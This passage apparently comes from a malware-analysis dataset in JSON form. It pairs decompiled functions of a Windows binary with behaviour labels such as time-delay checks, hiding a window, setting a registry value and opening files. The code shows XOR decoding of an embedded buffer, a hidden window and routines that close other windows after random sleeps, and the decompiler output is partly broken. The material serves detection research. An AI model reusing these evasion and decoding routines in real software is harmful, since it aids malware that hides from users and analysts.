        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404dd2) overlaps instruction at (ram,0x00404dd0)\n// \n\nvoid __cdecl fcn.00404da0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00404c80();\n    fcn.004021f0(&var_68h, var_4h, 0x411728, 0x11000);\n    *arg_8h = 0x411728;\n    *arg_ch = 0x11000;\n    return;\n}\n",
        "token_count": 259
    },
    "00401c30": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401cb2) overlaps instruction at (ram,0x00401caf)\n// \n\nuint __cdecl fcn.00401c30(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    bool bVar3;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg_8h, &var_4h);\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    bVar3 = true;\n    var_108h = 0;\n    puVar2 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)(arg_8h, &var_108h, 0x104);\n    if ((!bVar3) && (bVar3)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x4073e8);\n    if (iVar1 != 0) {\n        return 1;\n    }\n    (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x401bb0, 0);\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n    (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n    return 0;\n}\n",
        "token_count": 464
    },
    "004021f0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040222f) overlaps instruction at (ram,0x0040222c)\n// \n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.004021f0(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint32_t in_EDX;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint16_t in_SS;\n    bool bVar4;\n    bool bVar5;\n    uint *puStack28;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    bVar5 = false;\n    bVar4 = arg_14h == 0;\n    var_8h = 0;\n    if (!bVar4) {\n        do {\n            if ((bVar5) || (puStack28 = arg_14h,  !bVar5)) {\n                uVar3 = arg_10h & 0xffffff00 | *(var_8h + arg_10h);\n                uVar1 = var_8h;\n            }\n            else {\n                *unaff_EDI = *unaff_ESI;\n                in_EDX = 0x8a104d8b;\n                bVar4 = (var_8h + 1 | 8) == 0;\n                uVar1 = var_8h + 1 | 8;\n                uVar3 = arg_14h;\n                unaff_ESI = unaff_ESI + 1;\n            }\n            if (bVar4) {\ncode_r0x0040222f:\n                uVar2 = uVar3;\n                in_EDX = 0;\n            }\n            else {\n                puStack28 = uVar3 << 0x10;\n                uVar3 = uVar3 & 0xffff;\n                uVar2 = uVar3;\n                if (!bVar4) goto code_r0x0040222f;\n            }\n            puStack28 = puStack28 & 0xffff0000 | in_SS;\n            *(var_8h + arg_10h) = uVar2 ^ *(CONCAT44(in_EDX, uVar1) % arg_ch + arg_8h);\n            var_8h = var_8h + 1;\n            bVar5 = SBORROW4(var_8h, arg_14h);\n            bVar4 = var_8h == arg_14h;\n            in_EDX = arg_10h;\n            unaff_EDI = puStack28;\n            puStack28 = 0;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 637
    },
    "00403740": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004037bb) overlaps instruction at (ram,0x004037b2)\n// \n// WARNING: Removing unreachable block (ram,0x00403783)\n// WARNING: Removing unreachable block (ram,0x004037ac)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00403740(int32_t param_1, int32_t param_2, int32_t param_3, int32_t param_4)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < param_4) {\n        do {\n            *(iVar1 + param_3) = param_4 ^ *(iVar1 + param_3) ^ *(iVar1 % param_2 + param_1);\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < param_4);\n    }\n    return;\n}\n",
        "token_count": 201
    },
    "00404880": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404880(uint arg_8h)\n\n{\n    uint in_EAX;\n    bool in_CF;\n    \n    if ((!in_CF) && (in_CF)) {\n        out(0xbd, in_EAX);\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 102
    },
    "004036d0": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040371b)\n\nuint __cdecl fcn.004036d0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x411724, 0x422744, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 != 0) {\n        (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 154
    },
    "00401fb0": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00401fb0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071ec, 0x407230, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 79
    }
}